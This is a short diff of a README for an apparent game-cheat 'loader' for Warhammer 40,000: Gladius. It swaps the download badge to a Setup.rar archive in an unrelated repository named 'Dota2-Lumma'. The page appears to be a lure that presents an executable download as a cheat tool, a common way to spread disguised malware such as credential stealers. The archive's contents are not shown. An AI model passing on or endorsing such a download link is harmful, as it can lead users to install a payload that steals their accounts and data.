@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Warhammer 40,000: Gladius Cheats
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WADSADF/bvvb323/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rewfdf/Dota2-Lumma/releases/download/main/Setup.rar)
 
 ---
 
@@ -38,4 +38,5 @@ configs/
 `Warhammer-40-000-Gladius-Cheats` · Updated: 2026-10-31
 
 **Tags:** `warhammer-40000-gladius` `4x` `strategy` `sci-fi`
+
 
